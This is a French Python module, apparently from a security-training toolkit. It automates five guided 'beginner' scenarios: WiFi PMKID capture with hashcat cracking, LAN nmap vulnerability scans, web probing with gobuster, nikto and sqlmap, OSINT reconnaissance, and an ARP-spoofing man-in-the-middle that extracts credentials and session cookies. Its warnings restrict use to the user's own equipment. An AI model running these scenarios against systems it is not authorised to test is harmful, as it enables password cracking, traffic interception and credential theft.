"""Mode débutant — scénarios automatisés tout expliqué, étape par étape."""

import os
from core import ui, runner
from modules import analyzer


def _step(num, total, title, why, cmd_preview=""):
    """Affiche une étape : titre + pourquoi + ce qui va être lancé + confirmation."""
    print(f"\n{ui.C}{ui.BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{ui.RESET}")
    print(f"{ui.C}{ui.BOLD}  ÉTAPE {num}/{total} — {title}{ui.RESET}")
    print(f"{ui.C}{ui.BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{ui.RESET}\n")
    print(f"{ui.Y}Pourquoi :{ui.RESET}\n  {why}\n")
    if cmd_preview:
        print(f"{ui.D}Commande qui va tourner :\n  $ {cmd_preview}{ui.RESET}\n")
    return ui.confirm("Lancer ?")


def _intro(title, lines):
    ui.banner()
    print(f"\n{ui.M}{ui.BOLD}╔══════════════════════════════════════════╗{ui.RESET}")
    print(f"{ui.M}{ui.BOLD}║  SCÉNARIO : {title:<28} ║{ui.RESET}")
    print(f"{ui.M}{ui.BOLD}╚══════════════════════════════════════════╝{ui.RESET}\n")
    print("Ce scénario va :")
    for i, line in enumerate(lines, 1):
        print(f"  {ui.C}{i}.{ui.RESET} {line}")
    print()
    return ui.confirm("Démarrer ?")


# ═══════════════════════════════════════════════════════════════════════════
# SCÉNARIO 1 : Audit WiFi de TA propre box
# ═══════════════════════════════════════════════════════════════════════════

def scenario_wifi():
    if not _intro("AUDIT WIFI DE TA BOX", [
        "Activer le mode monitor de la carte WiFi",
        "Scanner les réseaux WiFi alentour",
        "Te demander de choisir TA box",
        "Tenter capture PMKID (silencieux, marche sur PMF)",
        "Convertir et préparer pour crack offline",
        "Analyser ce qui a été capturé",
        "Désactiver le monitor proprement"
    ]): return

    iface_in = ui.ask("interface WiFi (ex: wlan0)")
    if not iface_in: return

    # 1
    if _step(1, 7, "Activer le mode monitor",
        "Le mode monitor capture TOUT le trafic radio, même non destiné à ta carte.\n"
        "  Indispensable pour analyser un réseau WiFi.",
        f"sudo airmon-ng check kill && sudo airmon-ng start {iface_in}"):
        runner.run(["airmon-ng", "check", "kill"], tag="bgr-killnm", root=True, stream=False)
        runner.run(["airmon-ng", "start", iface_in], tag="bgr-monstart", root=True)

    mon = iface_in if iface_in.endswith("mon") else iface_in + "mon"

    # 2
    if _step(2, 7, "Scanner les réseaux WiFi",
        "On va lister tous les APs alentour avec leurs BSSID + channel + encryption.\n"
        "  Repère TA box dans la liste, note son BSSID et son CHANNEL.\n"
        "  Tape Ctrl-C dans 30s pour passer à la suite.",
        f"sudo airodump-ng {mon}"):
        runner.run(["airodump-ng", mon], tag="bgr-scan", root=True)

    bssid = ui.ask("BSSID de ta box (AA:BB:CC:DD:EE:FF)")
    chan  = ui.ask("channel de ta box")
    if not (bssid and chan):
        ui.warn("BSSID/channel manquant, arrêt"); ui.pause(); return

    # 3
    if _step(3, 7, "Capturer le PMKID",
        "Le PMKID est envoyé par certains APs dans le 1er paquet d'association.\n"
        "  S'il est présent → on peut tenter de cracker le mdp offline (hashcat).\n"
        "  Avantage : NE déconnecte personne, marche même si PMF est activé.\n"
        "  Durée : 60s max.",
        f"sudo timeout 60 hcxdumptool -i {mon} -w /tmp/pmkid.pcapng"):
        # set channel d'abord (sinon hcx fait hop et rate)
        runner.run(["iw", "dev", mon, "set", "channel", chan], tag="bgr-setch", root=True, stream=False)
        runner.run(["timeout", "60", "hcxdumptool", "-i", mon, "-w", "/tmp/pmkid.pcapng",
                    "--enable_status=1"], tag="bgr-pmkid", root=True)

    # 4
    if _step(4, 7, "Convertir la capture en hash crackable",
        "On extrait le hash format hashcat (mode 22000) depuis le .pcapng.",
        "hcxpcapngtool -o /tmp/hash.hc22000 /tmp/pmkid.pcapng"):
        runner.run(["hcxpcapngtool", "-o", "/tmp/hash.hc22000", "/tmp/pmkid.pcapng"],
                   tag="bgr-convert", root=True)

    has_hash = os.path.exists("/tmp/hash.hc22000") and os.path.getsize("/tmp/hash.hc22000") > 0

    # 5
    if has_hash and _step(5, 7, "Tenter le crack offline (rockyou)",
        "On essaie chaque mot de la wordlist rockyou contre le hash capturé.\n"
        "  Si ta box a un mdp dans rockyou (faible) → tu vas le voir.\n"
        "  Sinon, hashcat dit 'exhausted'. Ce n'est PAS une garantie de sécurité absolue,\n"
        "  juste qu'avec cette wordlist on n'a rien trouvé.",
        "hashcat -m 22000 /tmp/hash.hc22000 /usr/share/wordlists/rockyou.txt --quiet"):
        wl = "/usr/share/wordlists/rockyou.txt"
        if os.path.exists(wl):
            runner.run(["hashcat", "-m", "22000", "/tmp/hash.hc22000", wl, "--quiet"],
                       tag="bgr-hashcat")
        else:
            ui.warn(f"{wl} absent — sudo gunzip {wl}.gz")
    elif not has_hash:
        ui.warn("Pas de hash exploitable → l'AP ne renvoie pas de PMKID")
        ui.info("Alternative : capture handshake (nécessite un client qui se reconnecte)")

    # 6
    if _step(6, 7, "Analyser tous les logs de la session",
        "On lance l'analyseur sur les fichiers générés pour résumer ce qui a été trouvé.",
        "kt → Analyse post-attaque → Dernier log"):
        analyzer.analyze_latest()

    # 7
    if _step(7, 7, "Désactiver le mode monitor",
        "On remet la carte WiFi en mode normal pour récupérer internet.",
        f"sudo airmon-ng stop {mon} && sudo systemctl restart NetworkManager"):
        runner.run(["airmon-ng", "stop", mon], tag="bgr-monstop", root=True, stream=False)
        runner.run(["systemctl", "restart", "NetworkManager"], tag="bgr-nmrestart", root=True, stream=False)

    ui.ok("\nScénario terminé. Tous les logs : ls -lt ~/.kt-logs/ | head"); ui.pause()


# ═══════════════════════════════════════════════════════════════════════════
# SCÉNARIO 2 : Audit du LAN domestique
# ═══════════════════════════════════════════════════════════════════════════

def scenario_lan():
    if not _intro("AUDIT DU LAN DOMESTIQUE", [
        "Découvrir toutes les machines actives (arp-scan)",
        "Te demander de choisir une IP à analyser",
        "Scan complet des ports + détection services",
        "Détection des vulnérabilités connues",
        "Analyser les résultats et suggérer la suite"
    ]): return

    iface = ui.ask("interface (ex: eth0, wlan0)")
    if not iface: return

    # 1 — arp-scan
    if _step(1, 5, "Découvrir les machines du LAN",
        "ARP scan envoie une requête 'qui a IP X.X.X.X' à toutes les adresses du subnet.\n"
        "  Les machines actives répondent → on récupère IP + MAC + vendor.\n"
        "  Beaucoup plus fiable que ping (qui peut être bloqué).",
        f"sudo arp-scan -I {iface} --localnet"):
        runner.run(["arp-scan", "-I", iface, "--localnet"], tag="bgr-arpscan", root=True)

    target = ui.ask("IP à scanner en détail (depuis la liste ci-dessus)")
    if not target:
        ui.warn("IP manquante"); ui.pause(); return

    # 2 — nmap
    if _step(2, 5, "Scan complet des ports",
        "On scan tous les ports (1-65535) avec détection de version + OS.\n"
        "  Lent (5-30 min) mais exhaustif.",
        f"sudo nmap -sS -sV -O -p- -T4 {target}"):
        runner.run(["nmap", "-sS", "-sV", "-O", "-p-", "-T4", target],
                   tag="bgr-nmap-full", root=True)

    # 3 — vuln scripts
    if _step(3, 5, "Scan des vulnérabilités",
        "Scripts NSE catégorie 'vuln' → cherche les CVE connues sur les services trouvés.",
        f"nmap --script vuln -sV {target}"):
        runner.run(["nmap", "--script", "vuln", "-sV", target], tag="bgr-nmap-vuln")

    # 4 — analyse
    if _step(4, 5, "Analyser les ports + vulns trouvés",
        "L'analyseur va lire les logs nmap et highlight les ports critiques\n"
        "  (SMB, RDP, FTP, etc.) avec la prochaine attaque suggérée pour chacun.",
        "analyzer.analyze_latest()"):
        analyzer.analyze_latest()

    ui.ok("\nScénario terminé."); ui.pause()


# ═══════════════════════════════════════════════════════════════════════════
# SCÉNARIO 3 : Audit d'un site web (TON site / ton lab)
# ═══════════════════════════════════════════════════════════════════════════

def scenario_web():
    if not _intro("AUDIT D'UN SITE WEB", [
        "Identifier la stack technique (whatweb)",
        "Bruteforce des répertoires cachés (gobuster)",
        "Scan de vulnérabilités web (nikto)",
        "Test injection SQL si paramètre fourni (sqlmap)",
        "Analyser et résumer"
    ]): return

    url = ui.ask("URL du site (ex: http://192.168.1.50)")
    if not url: return

    # 1
    if _step(1, 5, "Identifier la stack technique",
        "WhatWeb fingerprint le serveur, le CMS, le framework, les libs JS.\n"
        "  Permet de cibler les bons exploits ensuite.",
        f"whatweb -v {url}"):
        runner.run(["whatweb", "-v", url], tag="bgr-whatweb")

    # 2
    if _step(2, 5, "Bruteforce des répertoires",
        "Tente l'existence de chemins courants (/admin, /backup, /.git, etc.)\n"
        "  pour trouver des fichiers/pages non liées publiquement.",
        f"gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt"):
        runner.run(["gobuster", "dir", "-u", url, "-w",
                    "/usr/share/wordlists/dirb/common.txt", "-t", "50"],
                   tag="bgr-gobuster")

    # 3
    if _step(3, 5, "Scan vulnérabilités web (Nikto)",
        "Nikto a une base de ~6700 tests : fichiers exposés, headers manquants,\n"
        "  versions vulnérables, configs par défaut.",
        f"nikto -h {url}"):
        runner.run(["nikto", "-h", url], tag="bgr-nikto")

    # 4
    has_param = ui.confirm("Une URL avec paramètre à tester en SQLi ? (ex: /page?id=1)")
    if has_param:
        sqli_url = ui.ask("URL complète avec paramètre")
        if sqli_url and _step(4, 5, "Test injection SQL",
            "sqlmap teste automatiquement toutes les techniques d'injection SQL\n"
            "  sur le paramètre détecté. --batch = mode non interactif.",
            f"sqlmap -u {sqli_url} --batch --level=2"):
            runner.run(["sqlmap", "-u", sqli_url, "--batch", "--level=2"], tag="bgr-sqlmap")

    # 5
    if _step(5, 5, "Analyser les findings",
        "L'analyseur lit les logs et highlight les endpoints sensibles (/admin, /.git),\n"
        "  les credentials capturés, les CVE détectées.",
        "analyzer.analyze_latest()"):
        analyzer.analyze_latest()

    ui.ok("\nScénario terminé."); ui.pause()


# ═══════════════════════════════════════════════════════════════════════════
# SCÉNARIO 4 : Recon OSINT sur soi-même (ton exposition publique)
# ═══════════════════════════════════════════════════════════════════════════

def scenario_osint():
    if not _intro("RECON OSINT (sur ton propre domaine)", [
        "WHOIS du domaine (info propriétaire publique)",
        "Énumération DNS complète",
        "theHarvester (emails + sous-domaines via moteurs de recherche)",
        "WhatWeb sur le site principal",
        "Résumé"
    ]): return

    domain = ui.ask("ton domaine (ex: mondomaine.fr)")
    if not domain: return

    if _step(1, 5, "WHOIS",
        "Récupère les infos publiques d'enregistrement du domaine.\n"
        "  RGPD masque les contacts perso depuis 2018 sur .fr/.eu mais pas .com.",
        f"whois {domain}"):
        runner.run(["whois", domain], tag="bgr-whois")

    if _step(2, 5, "Énumération DNS",
        "Liste tous les records DNS publics (A, AAAA, MX, NS, TXT, SRV).\n"
        "  Tente AXFR (transfert de zone) — jackpot si réussit.",
        f"dnsrecon -d {domain} -t std"):
        runner.run(["dnsrecon", "-d", domain, "-t", "std"], tag="bgr-dnsrecon")

    if _step(3, 5, "theHarvester (OSINT)",
        "Cherche emails et sous-domaines via Google/Bing/Hunter/etc.\n"
        "  Te montre ce qu'un attaquant voit de toi sans même te scanner.",
        f"theHarvester -d {domain} -b all -l 200"):
        binary = "theHarvester" if runner.need_tool("theHarvester") else "theharvester"
        runner.run([binary, "-d", domain, "-b", "all", "-l", "200"], tag="bgr-harvester")

    if _step(4, 5, "WhatWeb",
        "Identifie la stack derrière ton site web.",
        f"whatweb -v https://{domain}"):
        runner.run(["whatweb", "-v", f"https://{domain}"], tag="bgr-whatweb")

    if _step(5, 5, "Résumé des findings",
        "L'analyseur extrait emails, sous-domaines, IPs, technos détectées.",
        "analyzer.analyze_latest()"):
        analyzer.analyze_latest()

    ui.ok("\nScénario terminé. Voilà ce qu'un attaquant peut savoir de toi en 5 min."); ui.pause()


# ═══════════════════════════════════════════════════════════════════════════
# SCÉNARIO 5 : Démo MITM (LAB SEULEMENT)
# ═══════════════════════════════════════════════════════════════════════════

def scenario_mitm():
    print(f"\n{ui.R}{ui.BOLD}╔══════════════════════════════════════════╗{ui.RESET}")
    print(f"{ui.R}{ui.BOLD}║  ⚠  AVERTISSEMENT — DÉMO MITM             ║{ui.RESET}")
    print(f"{ui.R}{ui.BOLD}╚══════════════════════════════════════════╝{ui.RESET}\n")
    print(f"{ui.R}Cette démo intercepte le trafic réseau d'une 'victime'.{ui.RESET}")
    print(f"{ui.R}À utiliser UNIQUEMENT :{ui.RESET}")
    print(f"  - sur ton propre matériel (LAB perso, 2 VMs)")
    print(f"  - en environnement de cours déclaré")
    print(f"  - JAMAIS sur un réseau tiers / public\n")
    if not ui.confirm("Tu es dans un environnement autorisé ?"): return

    if not _intro("DÉMO MITM (LAB)", [
        "Activer le forwarding IP (sinon tu coupes le net de la victime)",
        "ARP spoof bidirectionnel victime↔gateway",
        "Capturer le trafic interceppé avec tcpdump",
        "Analyser : credentials clair, cookies, URLs, etc.",
        "Restaurer l'état réseau"
    ]): return

    iface  = ui.ask("interface (ex: eth0)")
    victim = ui.ask("IP victime (TA VM cible)")
    gw     = ui.ask("IP gateway")
    if not (iface and victim and gw): return

    # 1
    if _step(1, 5, "Activer IP forwarding",
        "Sans ça, tu bloques le trafic de la victime au lieu de le relayer (DoS au lieu de MITM).",
        "sudo sysctl -w net.ipv4.ip_forward=1"):
        runner.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], tag="bgr-ipfwd", root=True, stream=False)

    # 2 — arpspoof (lance en background dans 2 directions)
    ui.warn("ARP spoof tourne en background. Quand tu veux arrêter → Ctrl-C dans le terminal tcpdump.")
    if _step(2, 5, "ARP spoof bidirectionnel",
        "Tu deviens MITM : la victime pense que TU es la gateway, et la gateway pense que TU es la victime.\n"
        "  Tout le trafic victime↔internet passe par toi.",
        f"sudo arpspoof -i {iface} -t {victim} -r {gw}"):
        runner.run(["arpspoof", "-i", iface, "-t", victim, "-r", gw],
                   tag="bgr-arpspoof", root=True)

    # 3 — capture (ne sera atteint que quand l'user Ctrl-C arpspoof)
    if _step(3, 5, "Capturer le trafic intercepté",
        "On dump tout le trafic HTTP/FTP/DNS dans un .pcap pour analyse offline.\n"
        "  Durée : 60s puis stop automatique.",
        f"sudo timeout 60 tcpdump -i {iface} -w /tmp/mitm.pcap"):
        runner.run(["timeout", "60", "tcpdump", "-i", iface, "-w", "/tmp/mitm.pcap"],
                   tag="bgr-mitmcap", root=True)

    # 4 — analyse
    if _step(4, 5, "Analyser ce qui a été capturé",
        "L'analyseur extrait : credentials clair, cookies de session, JWT, AWS keys,\n"
        "  emails, URLs visitées. Highlight les trouvailles CRITIQUES.",
        "analyzer.analyze_file() sur /tmp/mitm.pcap"):
        if os.path.exists("/tmp/mitm.pcap"):
            from modules.analyzer import analyze, display, suggest, _read
            content = _read("/tmp/mitm.pcap")
            f = analyze(content)
            display(f, "/tmp/mitm.pcap")
            suggest(f)
        else:
            ui.warn("/tmp/mitm.pcap absent")

    # 5 — cleanup
    if _step(5, 5, "Restaurer l'état réseau",
        "On désactive le forwarding. ARP cache victime se restaurera automatiquement\n"
        "  dans 1-2 minutes (timeout normal).",
        "sudo sysctl -w net.ipv4.ip_forward=0"):
        runner.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], tag="bgr-ipfwd-off", root=True, stream=False)

    ui.ok("\nDémo terminée. À retenir : HTTPS protège du contenu, pas du métadonnées (SNI, IPs)."); ui.pause()


# ═══════════════════════════════════════════════════════════════════════════
# MENU
# ═══════════════════════════════════════════════════════════════════════════

ITEMS = [
    {
        "label": "[1] Audit WiFi de TA box",
        "fn": scenario_wifi, "status": "ok",
        "info": """Scénario complet en 7 étapes pour auditer la sécurité de TA propre box WiFi.

CHAQUE ÉTAPE : explication + commande affichée + confirmation avant lancement.
TOTAL : ~5-10 min selon ta box.
USAGE LÉGAL : ta propre box uniquement.

Étapes :
  1. Activer mode monitor
  2. Scanner réseaux WiFi
  3. Capturer PMKID (silencieux)
  4. Convertir en hash crackable
  5. Tenter crack avec rockyou
  6. Analyser les findings
  7. Désactiver monitor"""
    },
    {
        "label": "[2] Audit du LAN domestique",
        "fn": scenario_lan, "status": "ok",
        "info": """Découvrir et analyser toutes les machines de TON réseau local.

USAGE : sur ton LAN domestique pour voir l'inventaire et les services exposés.

Étapes :
  1. ARP scan → liste machines actives
  2. Tu choisis une IP
  3. nmap complet ports + services + OS
  4. nmap scripts vuln
  5. Analyseur → ports critiques + suggestions d'attaques"""
    },
    {
        "label": "[3] Audit d'un site web",
        "fn": scenario_web, "status": "ok",
        "info": """Audit complet d'une URL : stack, dirs cachés, vulns, SQLi.

USAGE : ton propre site, lab perso, cyber-range autorisé.

Étapes :
  1. whatweb → identifier stack
  2. gobuster → dirs cachés
  3. nikto → vulns connues
  4. sqlmap (si paramètre fourni)
  5. Analyseur → résumé + suggestions"""
    },
    {
        "label": "[4] Recon OSINT (ton domaine)",
        "fn": scenario_osint, "status": "ok",
        "info": """Voir ce qu'un attaquant peut savoir de TOI sans même te scanner.

USAGE : ton propre domaine. Pédagogique = découvrir son exposition publique.

Étapes :
  1. WHOIS
  2. Énum DNS complet
  3. theHarvester (OSINT actif)
  4. WhatWeb sur le site principal
  5. Résumé findings"""
    },
    {
        "label": "[5] Démo MITM (LAB SEULEMENT)",
        "fn": scenario_mitm, "status": "cfg",
        "info": """Démo pédagogique d'attaque MITM (Man-In-The-Middle) en LAB.

⚠ STRICTEMENT LIMITÉ : ton propre matériel, 2 VMs perso.
  Sur tout autre réseau = délit (Art. 323-1 Code pénal).

Étapes :
  1. IP forwarding ON
  2. ARP spoof victime↔gateway
  3. Capture trafic intercepté (60s)
  4. Analyse : credentials clair, cookies, URLs
  5. Restauration

LIMITES : HTTPS/HSTS bloquent l'interception du contenu sur sites modernes.
La démo montre POURQUOI HTTPS est important, pas comment 'tout pirater'."""
    },
]


def menu():
    while True:
        idx = ui.menu("MODE DÉBUTANT — Scénarios automatisés", ITEMS)
        if idx is None: return
        ITEMS[idx]["fn"]()
